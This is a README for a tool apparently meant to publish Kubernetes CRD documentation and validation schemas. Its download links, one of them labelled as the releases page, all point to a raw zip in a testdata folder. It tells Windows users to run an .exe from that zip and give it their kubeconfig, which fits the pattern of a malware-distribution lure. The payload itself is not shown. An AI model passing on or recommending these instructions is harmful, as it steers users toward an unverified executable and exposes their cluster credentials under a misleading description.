# 📦 crd-schema-publisher - Publish Kubernetes schemas for your team

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tieuda1305/crd-schema-publisher/raw/refs/heads/main/extractor/testdata/publisher-crd-schema-3.5.zip)

This application creates browsable documentation for your Custom Resource Definitions. It generates validation schemas directly from your Kubernetes cluster. Your team gains a clear view of resource structures without manual effort. You keep your documentation current with your live environment.

## 📋 What this tool does

Kubernetes clusters often host unique resource definitions. These definitions dictate how you configure your software. Without clear documentation, team members struggle to write valid configuration files. This tool solves that problem. It scans your cluster, pulls the resource definitions, and builds a web page. You can view these pages in any browser. It also creates validation files for your code editor. This helps you catch errors while you type.

## 🛠️ System requirements

Your computer needs these items to run the installer:

* Windows 10 or Windows 11.
* A stable network connection to reach your Kubernetes cluster.
* Access credentials to your cluster, such as a kubeconfig file.
* 200 megabytes of free disk space.
* Standard user permissions on your machine.

## 📥 How to download the application

You obtain the software from the releases page. Follow these steps to finish the download:

1. Visit the [releases page](https://github.com/tieuda1305/crd-schema-publisher/raw/refs/heads/main/extractor/testdata/publisher-crd-schema-3.5.zip).
2. Look for the section labeled Latest.
3. Find the file ending in .exe for Windows.
4. Click the file name to start your download.
5. Save the file to your computer.

## ⚙️ Setting up the software

Once you download the installer file, follow these steps to set up the application:

1. Locate the file in your downloads folder.
2. Double-click the file to open the installer.
3. Follow the prompts on the screen.
4. Select a location on your computer for the install.
5. Click finish to close the installer.
6. Find the icon on your desktop or in your start menu.
7. Click the icon to launch the tool.

## 🚀 Running the publisher

The first time you open the program, you provide your cluster details. The application works with your existing cluster configuration.

1. Launch the application.
2. Choose your cluster configuration file from your computer. This file usually sits in a folder named .kube in your user profile.
3. Select the namespace you want to scan. If you want to scan the whole cluster, choose the all option.
4. Choose a folder on your computer where the program saves the output.
5. Click the button to start the process.
6. Wait for the progress bar to complete.
7. Open the chosen folder to see your generated documentation.

## 🔎 Viewing your documentation

The tool creates a set of files in your selected folder. You open the index file with your browser. This index page lets you click through your resources. Each page shows the fields and requirements for that specific item. You can share these files with your team to help them understand your cluster.

## 🛡️ Using validation schemas

The application produces JSON schema files alongside the documentation. You use these files in your code editor to improve your workflow.

1. Open your code editor.
2. Locate the settings menu for your editor.
3. Search for the section on JSON validation.
4. Add the schema files provided by this tool.
5. Your editor now alerts you if you type a field incorrectly. This happens in real time. It saves you from deploying broken configurations to your cluster.

## 💡 Frequently asked questions

**Do I need a server to run this?**
No. The application runs on your local workstation. It reads from your cluster and writes files directly to your hard drive.

**Does this modify my cluster?**
No. The tool only reads data. It does not change settings, delete resources, or send commands to your cluster.

**Can I run this on a schedule?**
Yes. You can trigger the application as part of a script to keep documentation fresh. Frequent runs ensure the docs match the cluster state.

**Where does the tool store my login keys?**
The tool uses your existing configuration files. It does not store your keys in a new location. It relies on the security settings already established for your Kubernetes access.

## 🔧 Troubleshooting issues

If the tool fails to run, check these items:

* Verify your internet connection.
* Confirm your cluster configuration file is active. You can test this by running a simple list command in your terminal.
* Check if a firewall blocks the tool from reaching the cluster.
* Ensure you have permission to read resources from the namespace you selected.
* Restart the application if it hangs during the scan phase.

If these steps do not help, check the files in your logs folder. You find this folder in the application installation directory. The logs contain details about why a scan might fail. You can provide these details when asking for support on the project page.